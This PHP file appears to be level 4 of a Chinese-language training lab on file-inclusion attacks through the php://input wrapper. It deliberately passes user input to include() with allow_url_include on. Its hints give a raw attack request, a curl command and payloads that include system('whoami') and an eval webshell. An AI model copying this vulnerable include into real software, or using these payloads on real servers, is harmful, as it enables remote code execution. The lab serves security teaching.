<?php
/**
 * Level 4: php://input 伪协议
 * 难度: ★★☆☆☆
 * 描述: 使用php://input执行POST数据中的PHP代码
 * 目标: 通过POST提交PHP代码并执行
 */

// 开启allow_url_include (实际环境中需要在php.ini设置)
ini_set('allow_url_include', '1');

$message = '';
$content = '';

if (isset($_GET['file'])) {
    $file = $_GET['file'];

    ob_start();
    include($file);
    $content = ob_get_clean();
    $message = '<div class="success">✅ 文件包含成功</div>';
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 4 - php://input</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #f5576c;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        input[type="submit"] {
            background: #f5576c;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #e04555; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #f8f9fa;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #f5576c;
            text-decoration: none;
        }
        .warning-box {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 4 - php://input 伪协议</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: POST数据执行</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>php://input 可以读取POST请求的原始数据</li>
                    <li>如果POST的数据是PHP代码,include后会被执行</li>
                    <li>需要条件: allow_url_include=On (本关卡已开启)</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 攻击步骤</h3>
                <ol>
                    <li>构造GET请求: <code>?file=php://input</code></li>
                    <li>使用POST方法</li>
                    <li>POST数据为PHP代码: <code>&lt;?php phpinfo(); ?&gt;</code></li>
                    <li>发送请求,PHP代码被执行</li>
                </ol>
            </div>

            <div class="warning-box">
                <strong>⚠️ 注意:</strong> php://input 不能用于 enctype="multipart/form-data"
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>测试工具</h3>
                <form method="POST" action="?file=php://input" enctype="application/x-www-form-urlencoded">
                    <label>POST数据（PHP代码）:</label>
                    <textarea name="phpcode" placeholder="<?php phpinfo(); ?>"><?php echo isset($_POST['phpcode']) ? htmlspecialchars($_POST['phpcode']) : ''; ?></textarea>
                    <input type="submit" value="执行PHP代码" />
                </form>
                <p style="margin-top: 10px; color: #666; font-size: 14px;">
                    注意: 这个表单使用了 application/x-www-form-urlencoded,不是真正的php://input测试。<br>
                    要真正测试,请使用Burp Suite或curl发送原始POST数据。
                </p>
            </div>

            <?php if ($content !== ''): ?>
            <div class="result-box">
                <h3>执行结果:</h3>
                <pre><?php echo htmlspecialchars($content, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 使用Burp Suite测试:</strong>
                <div class="code-box">POST /file-include-lab/level4.php?file=php://input HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

&lt;?php system('whoami'); ?&gt;</div>

                <p><strong>使用curl测试:</strong></p>
                <div class="code-box">curl -X POST "http://localhost/file-include-lab/level4.php?file=php://input" \
  --data "<?php phpinfo(); ?>"</div>

                <p><strong>常用PHP代码:</strong></p>
                <ul>
                    <li>查看PHP信息: <code>&lt;?php phpinfo(); ?&gt;</code></li>
                    <li>执行系统命令: <code>&lt;?php system('whoami'); ?&gt;</code></li>
                    <li>获取Webshell: <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code></li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a>
        </div>
    </div>
</body>
</html>
